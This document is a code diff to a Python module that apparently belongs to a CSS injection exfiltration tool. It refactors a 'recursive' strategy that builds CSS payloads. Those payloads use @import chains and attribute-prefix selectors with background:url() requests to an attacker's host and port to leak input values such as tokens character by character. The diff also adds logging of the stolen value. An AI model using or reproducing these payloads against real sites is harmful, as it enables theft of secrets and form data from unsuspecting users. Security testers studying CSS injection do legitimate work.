@@ -1,7 +1,10 @@
 import urllib.parse
 
+from cssinj.client import Client
+from cssinj.console import Console, LogLevel
 from cssinj.strategies.base import BaseExfiltrationStrategy
 from cssinj.utils import default
+from cssinj.utils.dom import Attribute, Element
 
 
 class RecursiveStrategy(BaseExfiltrationStrategy):
@@ -10,54 +13,58 @@ class RecursiveStrategy(BaseExfiltrationStrategy):
     Exfiltrates the DOM structure of the HTML using recursive imports.
     """
 
-    name = "recursive"
+    name = 'recursive'
 
-    def __init__(self, hostname: str, port: int, element: str = "input", attribut: str = "value", timeout: float = 3.0) -> None:
-        super().__init__(hostname, port, timeout)
-        self.element = element
-        self.attribut = attribut
-
-    def generate_start_payload(self, client) -> str:
+    def generate_start_payload(self, client: Client) -> str:
         return self._generate_import(client)
 
-    def generate_next_payload(self, client) -> str:
+    def generate_next_payload(self, client: Client) -> str:
         stri = self._generate_import(client)
 
-        elements_attributs = []
+        elements_attributes = []
         for client_element in client.elements:
-            for element_attribut in client_element.attributs:
-                if element_attribut.name == self.attribut:
-                    elements_attributs.append(element_attribut)
+            for element_attribute in client_element.attributes:
+                if element_attribute.name == self.attribute:
+                    elements_attributes.append(element_attribute)
 
         # Check if the token is complete
-        stri += f"html:has({self.element}[{self.attribut}={repr(client.data)}]"
-        stri += (
-            f"{"".join([f":not({self.element}[{self.attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})"
-        )
-        stri += f"{"".join([":first-child" for i in range(client.counter)])}"
+        stri += f'html:has({self.element}[{self.attribute}={client.data!r}]'
+        stri += f'{"".join([f":not({self.element}[{self.attribute}={elements_attribut.value!r}])" for elements_attribut in elements_attributes])})'
+        stri += f'{"".join([":first-child" for i in range(client.counter)])}'
         stri += f'{{background:url("//{self.hostname}:{self.port}/e?n={client.counter}&cid={client.id}");}}'
 
         # Payload to extract the token
-        not_attributs = "".join(
-            [f":not({self.element}[{self.attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs]
+        not_attributes = ''.join(
+            [
+                f':not({self.element}[{self.attribute}={elements_attribut.value!r}])'
+                for elements_attribut in elements_attributes
+            ]
         )
-        first_child = ":first-child" * client.counter
-        stri += "".join(
+        first_child = ':first-child' * client.counter
+        stri += ''.join(
             map(
-                lambda x: f"html:has({self.element}[{self.attribut}^={repr(client.data+x)}]{not_attributs}{first_child}"
+                lambda x: f'html:has({self.element}[{self.attribute}^={client.data+x!r}]{not_attributes}{first_child}'
                 f'{{background:url("//{self.hostname}:{self.port}/v?t={urllib.parse.quote_plus(client.data+x)}&cid={client.id}");}}',
                 default.PRINTABLE,
             )
         )
         return stri
 
-    def handle_valid(self, client, data: str) -> str:
+    def handle_valid(self, client: Client, data: str) -> str:
         # Replace data (recursive gets the full accumulated value each time)
         client.data = data
-        return "valid"
+        return 'valid'
 
-    def handle_end(self, client) -> None:
-        return "end"
+    def handle_end(self, client: Client) -> str:
+        element = Element(name=self.element)
+        element.attributes.append(Attribute(name=self.attribute, value=client.data))
+        client.elements.append(element)
+        Console.log(
+            LogLevel.END_EXFILTRATION,
+            f'[{client.id}] - The {self.attribute} exfiltrated from {self.element} is : {client.data}',
+        )
+        client.data = ''
+        return 'end'
 
-    def _generate_import(self, client) -> str:
+    def _generate_import(self, client: Client) -> str:
         return f"@import url('//{self.hostname}:{self.port}/n?n={client.counter}&cid={client.id}');"
